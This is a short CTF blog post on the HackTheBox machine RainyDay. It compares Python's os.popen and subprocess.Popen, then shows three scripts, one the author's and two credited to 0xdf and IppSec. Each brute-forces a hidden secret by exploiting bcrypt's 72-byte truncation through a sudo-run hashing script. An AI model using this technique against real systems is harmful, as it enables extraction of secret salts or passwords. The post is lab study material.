+++
author = "Frenchie"
title = "RainyDay HTB"
date = "2023-02-23"
description = "RainyDay HTB"
tags = [
    "Gaming",
    "Hacking",
]
showthedate = false
+++

> The os.popen() function and the subprocess.Popen() function are both used for executing external commands in Python, but they have some differences that make one better than the other in different situations.

<!--more-->

os.popen() is an older function that is used to open a pipe to a command and read or write to the command's standard input or output. It is a higher-level function that abstracts away some of the details of process management. However, it is generally not recommended to use os.popen() for new code, as it is considered to be a legacy function.

subprocess.Popen() is a newer and more powerful function that provides more fine-grained control over the execution of external commands. It allows you to specify command-line arguments, environment variables, working directory, and more. It also provides more options for handling input and output, including piping, redirection, and buffering.

In general, subprocess.Popen() is considered to be the preferred function for executing external commands in modern Python code. It is more flexible and provides better control over the process execution. However, os.popen() may still be useful in certain situations where you need to quickly execute a simple command and capture its output.

In summary, if you need to execute external commands with more advanced options and greater control, subprocess.Popen() is generally the better choice. If you just need to execute a simple command and capture its output, os.popen() may still be useful, but it is recommended to use subprocess.Popen() instead.

### My First Trial
using `subprocess.communicate` to send the test_word.

```python
import bcrypt
import string
import subprocess
import re

secret = ''
found = False

while not found:
    p = subprocess.Popen(["sudo", "/opt/hash_system/hash_password.py"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    test_word = f"{'🎅'*(17-len(secret)//4)}{'A'* (3-len(secret)%4)}"
    print(f"{test_word=}", end="\r")
    output, err = p.communicate(test_word.encode("utf-8"))
    output_text = (output.decode("utf-8"))
    rainy_hash = re.search(r"Hash: ([\w|\W]*)\n", output_text).group(1)

    for c in string.printable[:-5]:
        if bcrypt.checkpw(test_word.encode() + secret.encode() + c.encode(), rainy_hash.encode()):
            print(f"{c=}", end="\r")
            secret += c
            print(f"{secret=}", end="\r")
            break
        if c == string.printable[-6]:
            print(f"Reaching end of printable strings. Final result {secret}")
            found = True
```

### from 0XDF
using `subprocess.run` and `input=`test_word.
```python
import bcrypt
import subprocess
import string

santa = "🎅"
secret = ""


while True:
    pass_length = 71 - len(secret)
    santa_num = pass_length // 4
    ah_len = pass_length % 4

    test_word = f"{'🎅'*santa_num}{'A'*ah_len}"
    out = subprocess.run(["sudo", "/opt/hash_system/hash_password.py"], input=test_word.encode(), stdout=subprocess.PIPE)

    for c in string.printable[:-6]:
        if bcrypt.checkpw((test_word+secret+c).encode(), out.stdout.split(b" ")[-1].strip()):
            print(f"\r{secret=}", end="")
            secret += c
            break

    else:
        break

print(f"\r{secret=:<30}")
```

### from IPPSEC
using `os.popen` with `echo` and piping.
```python
# bcrypt max is 72 bytes
required_length = 71 - len(append)
i = get_padding(required_length)
print(f"[+] Getting Hash for {i}")
out = os.popen(f"echo '{i}' | sudo /opt/hash_system/hash_password.py").read()
h = out[out.index("Hash: ") + 6:].strip()
print(f"[+] Hash: {h}")
return h
```